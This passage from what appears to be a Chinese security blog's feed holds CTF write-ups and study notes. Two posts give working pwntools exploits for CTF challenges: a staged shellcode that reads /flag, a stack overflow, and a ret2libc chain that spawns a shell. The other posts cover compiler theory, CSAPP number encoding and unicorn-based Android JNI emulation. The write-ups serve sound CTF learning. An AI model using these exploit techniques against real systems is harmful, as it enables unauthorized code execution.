这里向0xCAFE0000读入16字节，可以考虑rop，但检查保护时，就放弃了 写入shellcode,用orw的话，长度也远远不够 HINTS: 一次read不够多，为什么不再读一次呢？ 第一次将read的shellcode读入，然后再程序执行0xCAFE0000这段内存，从而执行读入的read，那就要好好设计一波read的shellcode了，起初我是用rdi这种64位的寄存器写的，但是最终长度远远超过16字节 shellcode = asm(&quot;&quot;&quot; mov rax,0 mov rsi,0xCAFE0010 mov rdi,0 mov rdx,0x1000 syscall &quot;&quot;&quot;) 然后只能全部改成edi这种32位寄存器的形式了 shellcode = asm(&quot;&quot;&quot; mov eax,0 mov esi,0xCAFE0010 mov edi,0 mov edx,0x1000 syscall &quot;&quot;&quot;) 但是还是不行 把mov 0的操作全部换成xor，就对了 shellcode = asm(&quot;&quot;&quot; xor eax,eax mov esi,0xCAFE0010 xor edi,edi mov edx,0x1000 syscall &quot;&quot;&quot;) 这里要调用read，就要涉及系统调用号： 在汇编程序中使用Linux系统调用。 您需要采取以下步骤在程序中使用Linux系统调用 将系统调用号放在EAX寄存器中。 结果通常在EAX寄存器中返回 &#x3D;&#x3D;这里注意64位和32的系统调用号是不一样的&#x3D;&#x3D; 32位： 传参方式：首先将系统调用号 传入 eax，sysread 的调用号 为 3 syswrite 的调用号 为 4 64位： 传参方式：首先将系统调用号 传入 rax，sysread 的调用号 为 0 syswrite 的调用号 为 1 所以这里的read系统调用号是0 这里写入read的shellcode后，执行我们写的shellcode，第二次写入的orw也是shellcode，这里要设置amd64位不然就无了。 这里有个细节在执行syscall指令时，程序会按照普通程序一样，会将shellcode的下一条指令压栈，所以在执行完syscall后，下一个指令要执行的地方就是syscall后的地址，这里除syscall这一条指令，长度为14，所以第二次写入的地址，只能是0xCAFE0000+14之后的地址，这里我们选择为0xCAFE0010就够了，然后直接写入orw的shellcode。 payload = asm(shellcraft.open(&#39;/flag&#39;)) payload += asm(shellcraft.read(3,0xcafe0500,0x100)) payload += asm(shellcraft.write(1,0xcafe0500,0x100)) 这里的缓冲区我原先是写0xcafe1000的，结果后面才发现它总共才申请了0x1000的大小内存，哈哈 完整代码: from pwn import * io = remote(&#39;week-1.hgame.lwsec.cn&#39;,30105) # context.log_level = &quot;debug&quot; context.arch = &quot;amd64&quot; shellcode = asm(&quot;&quot;&quot; xor eax,eax mov esi,0xCAFE0010 xor edi,edi mov edx,0x1000 syscall &quot;&quot;&quot;) print(&#39;len:&#39;,len(shellcode)) io.sendafter(&#39;shellcode:\\n&#39;,shellcode) # payload = b&#39;\\x90&#39; * 0x10 payload = asm(shellcraft.open(&#39;/flag&#39;)) payload += asm(shellcraft.read(3,0xcafe0500,0x100)) payload += asm(shellcraft.write(1,0xcafe0500,0x100)) io.send(payload) io.interactive() 结果： Week2rebefore_main题中 __attribute__属性修饰函数，参考链接：(61条消息) 浅析逆向中 gcc 在主函数前后运行的函数_沐一 · 林的博客-CSDN博客_逆向 init 该题考查base64，换表函数定义了__ attribute__ ((constructor))会使函数在 main() 函数之前被执行 这里ptrace检测反调试，即出现反调试就不进行换表操作 自己手动换表后用cyberchef解base64即可 Week3re","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"赛题复现wp","slug":"ctf/赛题复现wp","permalink":"https://pa1r0t.github.io/categories/ctf/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0wp/"}],"tags":[]},{"title":"pwn_practice1","slug":"pwn-practice1","date":"2023-01-13T03:50:36.000Z","updated":"2024-06-25T14:02:29.871Z","comments":true,"path":"2023/01/13/pwn-practice1/","link":"","permalink":"https://pa1r0t.github.io/2023/01/13/pwn-practice1/","excerpt":"pwn","text":"pwn hgame2018_flag_server开启dockerdocker run -v &quot;$(pwd):/ctf/work&quot; -i -t skysider/pwndocker /bin/bash 程序核心逻辑这里有个随机值，输入的值和随机值比较 我准备用逆向的守法，来搞它，写了个cpp，结果运行多次结果都不一样 #include&lt;time.h&gt; #include&lt;stdio.h&gt; #include&lt;random&gt; int main(void)&#123; unsigned int v3 = time(0); printf(&quot;%d\\n&quot;,v3); srand(v3); int v8 = rand(); printf(&quot;%u&quot;,v8); return 1; &#125; giao~~~~~ 然后我只能老老实实找漏洞了 先是发现可以读取字符串name 找到读取字符串的函数是自己编的 最后v10进行检验 这里看栈分布 直接在s1的下面，直接填充’A’*((0x50-0x10)+size(int)) expfrom pwn import * io = remote(&#39;node4.buuoj.cn&#39;,28388) # io = process(&#39;./flag_server&#39;) io.sendlineafter(&#39;your username length: &#39;,b&#39;-1&#39;) io.sendline(b&#39;A&#39;*0x44) io.interactive() io.close() 结果 ciscn_2019_c_1核心程序 利用点：利用gets，去覆盖栈中的内容，利用rop链泄漏puts函数在内存中的地址，然后通过这个地址去找对应版本的libc，找到内存中system的地址和bin_sh字符串的地址，再利用一次rop链执行system函数即可 这里有一个模块叫LibcSearcher，它可以让使用者不用担心本地和远程的libc是否统一，它可以帮你去寻找正在执行的libc。非常好用 寻找rop目的：寻找pop rdi ret;指令，因为该文件是64位，而64位文件采用寄存器存放参数，第一个参数存放的寄存器就是rdi 命令： ROPgadget --binary ./ciscn_2019_c_1 --only &#39;pop|ret&#39; 结果： 脚本：from pwn import * from LibcSearcher import * # io = process(&#39;./ciscn_2019_c_1&#39;) io = remote(&quot;node4.buuoj.cn&quot;,26320) elf = ELF(&#39;ciscn_2019_c_1&#39;) # encrypt_addr = elf.sym[&#39;encrypt&#39;] puts_got = elf.got[&#39;puts&#39;] # 用于打印puts的地址 puts_plt = elf.plt[&#39;puts&#39;] # puts函数地址 rdi_ret = 0x400c83 # puts函数的参数 puts函数的地址 puts函数执行完的返回地址，用于下一次的shellcode payload1 = b&#39;A&#39; * 0x50 + p64(0) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr) io.sendlineafter(b&#39;Input your choice!&#39;,b&#39;1&#39;) io.sendlineafter(b&#39;Input your Plaintext to be encrypted&#39;,payload1) io.recvuntil(b&#39;Ciphertext\\n&#39;) io.recvuntil(b&#39;\\n&#39;) # 拿到puts在内存中的地址 puts_addr = u64(io.recvline().strip().ljust(8,b&#39;\\0&#39;)) print(&#39;addr:&#39;,hex(puts_addr)) # 找内存libc的地址 libc = LibcSearcher(&#39;puts&#39;,puts_addr) addr_base = puts_addr - libc.dump(&quot;puts&quot;) print(&#39;libc&#39;,addr_base) sys_addr = libc.dump(&#39;system&#39;) + addr_base binsh_addr = libc.dump(&#39;str_bin_sh&#39;) + addr_base payload2 = b&#39;A&#39; * 0x50 + p64(0) + p64(rdi_ret) + p64(binsh_addr) + p64(sys_addr) + p64(encrypt_addr) io.sendlineafter(b&#39;Input your Plaintext to be encrypted&#39;,payload2) io.interactive() 结果：","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"赛题复现wp","slug":"ctf/赛题复现wp","permalink":"https://pa1r0t.github.io/categories/ctf/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0wp/"}],"tags":[]},{"title":"编译2","slug":"编译篇2","date":"2023-01-12T14:07:41.000Z","updated":"2024-06-25T13:58:35.067Z","comments":true,"path":"2023/01/12/编译篇2/","link":"","permalink":"https://pa1r0t.github.io/2023/01/12/%E7%BC%96%E8%AF%91%E7%AF%872/","excerpt":"高级语言描述","text":"高级语言描述 编译基础知识 高级语言：程序语言是一个记号系统 语法 语法使得这串字符形成一个形式上正确的程序。 语法＝词法规则＋语法规则 例如： 0.5*x1+c * 0.5、x1、c、+是语言的单词符号 0.5*x1+c是语言的语法单位 语法单位：表达式、子句、语句、函数、过程、程序 语言的词法规则和语法规则定义了程序的形 式结构，是判断输入字符串是否构成一个形 式上正确的程序的依据。 语义 字母表和符号表一些概念： 字母表：是符号的非空有穷集合，是符号的非空有穷集合 符号串：顾名思义。空串：不含有任何符号的串称作空串，记作ε 句子：字母表上符合某种规则构成的串。串就是句子 （注：约定用a,b,c…表示符号；用α,β,γ…表示符号串； 用A,B,C…表示其集合） 符号串集合的运算： 符号串集合的运算： 例如：A&#x3D;{a,b}; B&#x3D;{c,e,d} 则AB&#x3D;{ac,ae,ad,bc,be,bd} A中的元素必须在B元素的前面，否则是错的，这个顺序要搞对 例如：串集A＝{a}的各次方幂定义为： – A0&#x3D;{ε} – A1&#x3D;A&#x3D;{a} – …… – An&#x3D;AAn-1(n&gt;0)&#x3D;{a…a} 字母表的闭包与正闭包 字母表A的闭包（A）：A&#x3D;A0∪A1∪A2∪… 即：由A上符号组成的所有串的集合（包括空串 ε ） 字母表A的正闭包（A+）：A+&#x3D; A1 ∪A2∪ …&#x3D;A*-{ε} 即：由A上符号组成的所有串的集合（不包括空 串ε ） 字母表上语言：是字母表上正闭包的子集 文法与语言的关系文法： 其语法规则如下： – &lt;句子&gt;→&lt;主语&gt;&lt;谓语&gt; – &lt;主语&gt; →&lt;形容词&gt;&lt;名词&gt; – &lt;谓语&gt; →&lt;动词&gt;&lt;宾语&gt; – &lt;宾语&gt; → &lt;形容词&gt;&lt;名词&gt; – &lt;形容词&gt; →Young | pop – &lt;名词&gt; →men | music – &lt;动词&gt; →like 相关概念： 非终结符 出现在规则的左部、用&lt;&gt;括起来、表示一定 语法概念的词 非终结符集合用VN表示。 终结符 语言中不可再分割的字符串(包括单个字符 组成的串)。注：终结符是组成句子的基本单位 终结符集合用VT表示。 开始符号","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"前置知识学习","slug":"re/前置知识学习","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"编译原理","slug":"编译原理","permalink":"https://pa1r0t.github.io/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"}]},{"title":"csapp1","slug":"csapp1","date":"2023-01-09T06:30:39.000Z","updated":"2024-06-25T14:00:34.681Z","comments":true,"path":"2023/01/09/csapp1/","link":"","permalink":"https://pa1r0t.github.io/2023/01/09/csapp1/","excerpt":"学习一下csapp,第一篇","text":"学习一下csapp,第一篇 在32位系统：-2147483648 &lt; 2147483647 结果为false ​ int i &#x3D; -2147483648; i &lt; 2147483647 结果为true ​ -2147483648-1 &lt; 2147483647 结果为true 在计算机中运算是会发生溢出，假如运算后的数超过了32位，那最终结果可能是一个负数，或者是其他正整数 我们用linux中的gdb软件来证明其中的结论 很显然，上述超乎我们的预想 然而在整数运算时是符合交换律的，但是在计算机中浮点数却不符合交换律 这里做一个实验：用(1e20 + -1e20) + 3.14 结果为：3.1400000000000001 再用1e20 + (-1e20 + 3.14)，这里3.14对于-1e20微不足道 结果为：0 他们用有限的位组合形式表示在数域中无线扩张的数 定点数和浮点数计算机中只能通过约定小数点的位置来表示 小数点位置约定在固定位置的数称为定点数 小数点位置约定为可浮动的数称为浮点数 定点小数用来表示浮点数的尾数部分 任何实数：X&#x3D;(-1)^s^ ×M×R^E^ 其中，S取值为0或1，用来决定数X的符号；M是一个二进制定点小数 ，称为数X的尾数（mantissa）；E是一个二进制定点整数，称为数X 的阶或指数（exponent）；R是基数（radix、base），可以为2、4和16等,计算机中只要表示S、M和E三个信息，就能确定X的值，叫浮点数 定点数的编码表示浮点数（可用一个定点小数和一个定点整数来表示） 定点数的编码（解决正负号问题）: 原码、补码、移码、反码 （很少用） 原码表示： 其中由上图得0有两种表示，不唯一 加减方式，对于同号，取绝对值相加，然后在加上符号，对于异号，是比较哪个绝对值大，然后大的间小的，然后再加上绝对值大的符号。这样加减方式繁琐不统一 &#x3D;&#x3D;从 50年代开始，整数都采用补码来表示 但浮点数的尾数用原码定点小数表示&#x3D;&#x3D; 补码 - 模运算（modular运算）在一个模运算系统中，一个数与它除以“模”后的余数等价 一个负数的补码等于模减该负数的绝对值 对于某一确定的模，某数减去小于模的另一数，总可 以用该数加上另一数负数的补码来代替 补码（modular运算）：+ 和– 的统一 例1：“钟表”模运算系统 假定时针只能顺拨，从10点倒拨4格后是几点？ 10- 4 &#x3D; 10+(12- 4) &#x3D; 10+8 &#x3D; 6（mod 12） 结论：一个负数的补码等于将对应正数补码 各位取反、末位加一补码的定义 假定补码有n位，则：[X]补&#x3D; 2n + X （-2n-1≤X＜2n-1 ，mod 2n） X是真值，[x]补是机器数 求特殊数的补码假定机器数有n位： ① [-2^n-1^]补&#x3D; 2^n^ - 2^n-1^ &#x3D; 10…0（n-1个0） （mod 2^n^） ② [-1]补&#x3D; 2^n^ - 0…01 &#x3D; 11…1（n个1） （mod 2^n^) ③ [+0]补&#x3D; [-0]补&#x3D; 00…0（n个0） 变形补码的表示变形（4’s）补码：双符号，用于存放可能溢出的中间结果 求真值的补码: 简便方法：从右向左遇到第一个1的前面各位取反 求补码的真值: 简便求法： 符号为0，则为正数，数值部分相同 符号为1，则为负数，数值各位取反，末位加1 移码表示Excess 什么是移码表示？ 将每一个数值加上一个偏置常数（ Excess &#x2F; bias） 通常，当编码位数为n时，bias取 2^n-1^ 或 2^n-1^-1（如 IEEE 754) 为什么要用移码来表示指数（阶码）? 便于浮点数加减运算时的对阶操作（比较大小） 带符号整数有三种定点编码方式： Signed and magnitude （原码）：定点小数，用来表示浮点数的尾数 Excess (biased) notion （移码）：定点整数，用于表示浮点数的阶（指数） Two’s complement （补码）：50年代以来，所有计算机都用补码来表示带符号整数 为什么用补码表示带符号整数？ 补码运算系统是模运算系统，加、减运算统一 数0的表示唯一，方便使用 比原码多表示一个最小负数 无符号数:常在一个数的后面加一个“u”或“U”表示无符号数 &#x3D;&#x3D;若同时有无符号和带符号整数，则C编译器将带符号整数强制转换为无符号数&#x3D;&#x3D; 带*的与预想的不同 编译器处理常量时默认的类型 C表达式-2147483648 &lt; 2147483647的执行结 果为false，这是因为编译器在编译时，是把符号和字面量分开识别，先识别字面量2147483648，2147483648在C90中时2^31^,属于unsigned int，所以此次比较是根据无符号数来进行比较。 若定义变量“int i&#x3D;-2147483648;”，则“i &lt; 2147483647”的执行 结果为true，这个不用解释，int类型已经定义好类型了，不需要再判别 如果将表达式写成“-2147483647-1 &lt; 2147483647”，则结果会怎 样呢？是true 不过C99的标准不一样，看上面的表就知道","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"前置知识","slug":"re/前置知识","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"csapp","slug":"csapp","permalink":"https://pa1r0t.github.io/tags/csapp/"}]},{"title":"编译篇1","slug":"编译篇1","date":"2023-01-09T02:16:11.000Z","updated":"2024-06-25T13:58:49.778Z","comments":true,"path":"2023/01/09/编译篇1/","link":"","permalink":"https://pa1r0t.github.io/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/","excerpt":"引论学习","text":"引论学习 程序设计语言的转换 编译：从高级语言到低级语言的过程 解释：接受高级语言的一条语句输入，进行解释并控制计算机执行，马上获得该语句的执行结果，然后接受下一条语句 优点：实现人机交互 缺点：效率差，每次都要解释，而不像编译一样，只需编译一次，以后只需执行即可 编译的转换过程： 两阶段转换：编译一一执行 三个阶段的转换：编译一一汇编一一运行 编译程序概述自然语言的翻译： 识别句子中一个个单词 分析句子的语法结构 根据句子的含义进行初步翻译 对译文进行修饰 写出最后译文 编译程序的工作： 词法分析 语法分析 语义分析和中间代码的生成 优化 目标代码的生成 词法分析： 任务：对源程序的字符串进行扫描和分解，识别出一个个单词 基本字：void,int,float 标识符：a,b,c,d 长整数：50 运算符：+，-，*，&#x3D; 界限符：{}，；（） 词法分析依照词法规则，识别出正确的单词，转换成统一规格，备用 转换： 对基本字、运算符、界限符的转换 标识符的转换 常数的转换 转换完成的格式（类号、内码） 描述词法规则的有效工具是正规式和有限自动机 语法分析： 任务：词法分析后的单词，根据语言的语法规则，把单词符号组成各类语法单位：子句、语句 语法规则：规定单词如何组成句，称为文法 语法规则的表示： BNF: A::&#x3D;B|C 表示A定义为B或C 语法分析的方法：推导和规约 推导：最左推导和最右推导 规约：最右规约和最左规约 赋值语句的语法规则： A::&#x3D;V&#x3D;E E::&#x3D;T|E+T T::&#x3D;F|T*F F::&#x3D;V|(E)|C V::&#x3D;标识符 C::&#x3D;常数 例题：​ x &#x3D; a + b*50 根据上面的文法规则运用最右推导：最右推导就是每次只变换最右的字母 A&#x3D;&gt;V&#x3D;E &#x3D;&gt; V&#x3D;E+T &#x3D;&gt; V&#x3D;E+T*F &#x3D;&gt; T&#x3D;E+T*C &#x3D;&gt; T&#x3D;E+T*50 &#x3D;&gt; T&#x3D;E+F*50 &#x3D;&gt; T&#x3D;E+V*50 &#x3D;&gt; T&#x3D;E+b*50 &#x3D;&gt; T&#x3D;T+b*50 &#x3D;&gt; T&#x3D;V+b*50 &#x3D;&gt; T&#x3D;a+b*50 如何最左规约，就是从T&#x3D;a+b*50变换到A,也就是赋值运算成立，每次只变换最左边的字母，是最右推导的逆运算 计算机是用语法树来检验语法： 中间代码生成 任务：根据语法分析其中的含义，进行初步翻译，产生介于源代码和目标代码之间的一种代码 分为两阶段的工作： 对每种语法范畴进行静态语义检查 如果语义正确，就进行中间代码的翻译 中间代码形式：四元式、三元式、逆波兰式 将x&#x3D;a+b*50变成中间代码： 序号 算符 左操作数 右操作数 结果 （1） 将整常数50转换为实常数 T1 （2） * b T1 T2 （3） + a T2 T3 （4） &#x3D; T3 x 以上就是四元式 优化 对中间代码进行加工变换，变换出效率更高的代码 原则：等价变换，在不改变原意的情况下 主要方面： 公共子表达式的提取：x&#x3D;(a+b)*c+(a+b)*d 合并已知量：c&#x3D;a+b d &#x3D; a+b 未改变a，b的值 删除无用语句：一些注释或者一些与程序本身无关的表达式 循环优化 例如将以下语句转成中间代码： for( k = 1; k &lt;= 100; k++)&#123; m = i + 10*k; n = j + 10*k; &#125; 优化：每次乘实际上都是在上一次的基础是+10,所以能将乘操作优化成加法操作，来达到提升效率的目的 目标代码生成 任务：把优化的中间代码转化成特定机器上的低级语言 目标指令的形式： 绝对指令代码：就是01010的机器代码如exe文件，可立即执行 汇编指令代码：汇编语言程序，需要通过汇编程序汇编后才能运行 可重定位指令代码：先将各目标模块连接起来，确定变量、常数在主存中的位置，装入主存后才能成为可以运行的绝对指令代码 表格与表格管理 表格作用：用来记录源程序的各种信息以及编译过程中的各种状况 与编译前三阶段有关的表格： 符号表：用来登记 源程序中的常量名、 变量名、数组名、 过程名等，记录它 们的性质、定义和引用情况 常数表与标号表：登记各类常数值，登记标号的定义与作用 入口名表：登记过程的层号，分程序符号表入口 中间代码表 出错与处理错误类型: 语法错误:在词法分析和语法分析阶段检测出来 语义错误：一般在语义分析阶段检测 遍：指对源程序或源程序的中间结果从头到尾扫 描一次，并做有关的加工处理，生成新的中间结 果或目标代码的过程。 （遍与阶段的含义毫无关系。） 一遍扫描 &#x3D;&#x3D;一遍扫描不是一次性扫描和分析，而是通过一句一句的表格是进行反复扫描和分析&#x3D;&#x3D; 编译程序生成生成方式： 直接用机器语言编写编译程序 用汇编语言编写编译程序 注：编译程序核心部分常用汇编语言编写 用高级语言编写编译程序：这是普遍采用的方法 .自编译：内置核心编译程序，如何用自身的核心程序去编译其他程序 编译工具：LEX(词法分析)与YACC(用于自动产生LALR分析 表) 移植（同种语言的编译程序在不同类型的机器之 间移植） 写编译程序的基本条件： 源程序语言 目标程序语言 编译方法","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"前置知识学习","slug":"re/前置知识学习","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"编译原理","slug":"编译原理","permalink":"https://pa1r0t.github.io/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"}]},{"title":"ollvm做法","slug":"ollvm做法","date":"2023-01-02T14:06:24.000Z","updated":"2024-06-25T14:02:19.299Z","comments":true,"path":"2023/01/02/ollvm做法/","link":"","permalink":"https://pa1r0t.github.io/2023/01/02/ollvm%E5%81%9A%E6%B3%95/","excerpt":"unicorn start","text":"unicorn start 目标:处理ollvm混淆 用脚本处理该函数在脚本中设置起始地址和文件名 然后执行该python文件","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"常见混淆技术","slug":"ctf/常见混淆技术","permalink":"https://pa1r0t.github.io/categories/ctf/%E5%B8%B8%E8%A7%81%E6%B7%B7%E6%B7%86%E6%8A%80%E6%9C%AF/"}],"tags":[]},{"title":"unicorn_learning4","slug":"unicorn-learning4","date":"2022-12-31T06:12:48.000Z","updated":"2024-06-25T14:03:49.756Z","comments":true,"path":"2022/12/31/unicorn-learning4/","link":"","permalink":"https://pa1r0t.github.io/2022/12/31/unicorn-learning4/","excerpt":"unicorn_starting 模拟Jni与Java交互","text":"unicorn_starting 模拟Jni与Java交互 目标hook这个函数，其中存在调用java类和java函数 尝试将上一次的代码进行修改后直接执行，观察结果 注册java类和方法结果发现不能找到java这个类，下面已经给出申明，直接复制即可 class com_sec_udemo_MainActivity(metaclass=JavaClassDef, jvm_name=&quot;com/sec/udemo/MainActivity&quot;): def __init__(self): pass # 添加自定义java类 emulator.java_classloader.add_class(com_sec_udemo_MainActivity) 执行后发现又要声明相关方法: 声明方法： @java_method_def(name=&#39;getSaltFromJava&#39;,signature=&#39;(Ljava/lang/String;)Ljava/lang/String;&#39;, args_list=[&#39;jstring&#39;],native=False) # 这里native=False申明此方法非native方法 def getSaltFromJava(self,mu,data): pass 这个函数在java中的功能如下： 这里我们作出拼接返回即可 执行后再次报错 这里我们缺少jobject对象，这里我们手动创建一下，然后传入进去 obj = com_sec_udemo_MainActivity() sign = emulator.call_symbol(libnat_mod,&#39;Java_com_sec_udemo_MainActivity_sign_1lv3&#39;, emulator.java_vm.jni_env.address_ptr,obj,&#39;123&#39;) print(sign) 然后这里又有相加时出现错误 这里我们调试一下，data的内容： 一看是java string类型，类型展开发现value中value就是python的str类型 修改后成功出结果： 完整代码： from unicorn import * import logging import sys from androidemu.java.helpers.native_method import native_method from UnicornTraceDebugger import udbg from androidemu.emulator import Emulator from androidemu.utils import memory_helpers from androidemu.java.java_classloader import JavaClassDef from androidemu.java.java_method_def import java_method_def # 配置logging logging.basicConfig( stream=sys.stdout, level=logging.DEBUG, format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot; ) # 用于打印调试信息 logger = logging.getLogger(__name__) class com_sec_udemo_MainActivity(metaclass=JavaClassDef, jvm_name=&quot;com/sec/udemo/MainActivity&quot;): def __init__(self): pass @java_method_def(name=&#39;getSaltFromJava&#39;,signature=&#39;(Ljava/lang/String;)Ljava/lang/String;&#39;, args_list=[&#39;jstring&#39;],native=False) def getSaltFromJava(self,mu,data): print(&#39;hello&#39;) return data.value.value + &#39;salt..&#39; # 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器 @native_method def __aeabi_memclr(mu,addr,size): mu.mem_write(addr,bytes(size)) print(&#39;__aeabi_memclr_ptr (addr:%x,size:%d)&#39; % (addr,size)) @native_method def __aeabi_memcpy(mu,dist,source,size): data = mu.mem_read(source,size) mu.mem_write(dist,bytes(data)) print(&#39;__aeabi_memcpy (dist:%x,source:%x)&#39; % (dist,source)) @native_method def sprintf(mu,buffer,format,arg1,arg2): format1 = memory_helpers.read_utf8(mu,format) data1 = memory_helpers.read_utf8(mu,arg1) res = format1 % (data1,arg2) mu.mem_write(buffer,bytes((res+&#39;\\x00&#39;).encode(&#39;utf-8&#39;))) print(&#39;sprintf (%s)&#39; % (format)) # 创建模拟器 emulator = Emulator() # 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容 # 在导入so文件之前hook才生效，导入之后没法hook emulator.modules.add_symbol_hook(&#39;__aeabi_memclr&#39;, emulator.hooker.write_function(__aeabi_memclr) + 1) emulator.modules.add_symbol_hook(&#39;__aeabi_memcpy&#39;, emulator.hooker.write_function(__aeabi_memcpy) + 1) emulator.modules.add_symbol_hook(&#39;sprintf&#39;, emulator.hooker.write_function(sprintf) + 1) # 添加自定义java类 emulator.java_classloader.add_class(com_sec_udemo_MainActivity) # 加载相关so文件 # do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作， # 这可能会涉及更多库的调用 emulator.load_library(&#39;./lib/libc.so&#39;,do_init=False) libnat_mod = emulator.load_library(&#39;./lib/libnative-lib.so&#39;,do_init=False) # 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址 dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL) # 开始执行想要执行的jni函数 try: # 根据so模块调用指定的函数，后面都是函数的参数 # 参数1: JNIEnv # 参数2: 是java类的对象，这里填0即可 # 参数3: 是函数输入字符串 obj = com_sec_udemo_MainActivity() sign = emulator.call_symbol(libnat_mod,&#39;Java_com_sec_udemo_MainActivity_sign_1lv3&#39;, emulator.java_vm.jni_env.address_ptr,obj,&#39;123&#39;) print(sign) except UcError as e: # 打印调用栈 tracks = dbg.get_tracks() # 这里打印调用地址即可，打印后100条 for addr in tracks[-100:-1]: print(hex(addr - 0xcbc66000)) print(e)","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"前置知识学习","slug":"re/前置知识学习","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"unicorn","slug":"unicorn","permalink":"https://pa1r0t.github.io/tags/unicorn/"}]},{"title":"unicorn_learning3","slug":"unicorn-learning3","date":"2022-12-31T01:12:04.000Z","updated":"2024-06-25T14:03:45.114Z","comments":true,"path":"2022/12/31/unicorn-learning3/","link":"","permalink":"https://pa1r0t.github.io/2022/12/31/unicorn-learning3/","excerpt":"unicorn start 模拟器框架自动填充got表项内容","text":"unicorn start 模拟器框架自动填充got表项内容 目标hook JNI函数 hook JNI函数的条件： 框架： 打印调试信息import logging import sys # 配置logging logging.basicConfig( stream=sys.stdout, level=logging.debug, format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot; ) # 用于打印调试信息 logger = logging.getLogger(__name__) 创建模拟器+导入so文件+执行用写好的框架进行模拟执行，不需要考虑手动填充got表项 # 创建模拟器 emulator = Emulator() # 加载相关so文件 # do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作， # 这可能会涉及更多库的调用 emulator.load_library(&#39;./lib/libc.so&#39;,do_init=False) libnat_mod = emulator.load_library(&#39;./lib/libnative-lib.so&#39;,do_init=False) # 开始执行想要执行的jni函数 try: # 根据so模块调用指定的函数，后面都是函数的参数 # 参数1: JNIEnv # 参数2: 是java类的对象，这里填0即可 # 参数3: 是函数输入字符串 sign = emulator.call_symbol(libnat_mod,&#39;Java_com_sec_udemo_MainActivity_sign_1lv2&#39;, emulator.java_vm.jni_env.address_ptr,0,&#39;123&#39;) print(sign) except UcError as e: print(e) 这里出现libc的基地址 这里出现libnative-lib.so的基地址。3）处有报错，但又不知道哪里有错 跟踪报错信息打印异常地址和地址调用栈,这里打印最后100条即可,用udbg打印 # 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址 dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL) # 开始执行想要执行的jni函数 try: # 根据so模块调用指定的函数，后面都是函数的参数 # 参数1: JNIEnv # 参数2: 是java类的对象，这里填0即可 # 参数3: 是函数输入字符串 sign = emulator.call_symbol(libnat_mod,&#39;Java_com_sec_udemo_MainActivity_sign_1lv2&#39;, emulator.java_vm.jni_env.address_ptr,0,&#39;123&#39;) print(sign) except UcError as e: # 打印调用栈 tracks = dbg.get_tracks() # 这里打印调用地址即可，打印后100条 for addr in tracks[-100:-1]: print(hex(addr - 0xcbc66000)) # 注意这里要减去基地址 print(e) 这里有函数参数提示： 这里有出现负地址，负地址就是函数执行到libc.so文件中，这里由于没有初始化的缘故，可能libc中部分函数执行失败，这里我们手动hook，&#x3D;&#x3D;本质是hook got表地址&#x3D;&#x3D; 这里我们定位到ida中出错的地址 发现是这个库函数有问题。那就hook它 hook添加hook 此处必须在导入so文件之前就hook，在导入so文件之前hook才生效，导入之后没法hook # 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器 @native_method def __aeabi_memclr(mu,addr,size): print(&#39;__aeabi_memclr_ptr (addr:%x,size:%d)&#39; % (addr,size)) # 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容 # 在导入so文件之前hook才生效，导入之后没法hook emulator.modules.add_symbol_hook(&#39;__aeabi_memclr&#39;, emulator.hooker.write_function(__aeabi_memclr) + 1) 其他函数以此类推 关于sprintf函数，第一个参数，是a2，就是buffer地址 全部函数hook后： 这里输出是空因为，我们hook相关函数还未在unicorn中实现，这里我们做个实现即可 @native_method def __aeabi_memclr(mu,addr,size): mu.mem_write(addr,bytes(size)) print(&#39;__aeabi_memclr_ptr (addr:%x,size:%d)&#39; % (addr,size)) @native_method def __aeabi_memcpy(mu,dist,source,size): data = mu.mem_read(source,size) mu.mem_write(dist,bytes(data)) print(&#39;__aeabi_memcpy (dist:%x,source:%x)&#39; % (dist,source)) @native_method def sprintf(mu,buffer,format,arg1,arg2): format1 = memory_helpers.read_utf8(mu,format) data1 = memory_helpers.read_utf8(mu,arg1) res = format1 % (data1,arg2) mu.mem_write(buffer,bytes((res+&#39;\\x00&#39;).encode(&#39;utf-8&#39;))) print(&#39;sprintf (%s)&#39; % (format)) 这里说明一下bytes()函数放入int型会输出什么： 最终结果： 全部代码： from unicorn import * import logging import sys from 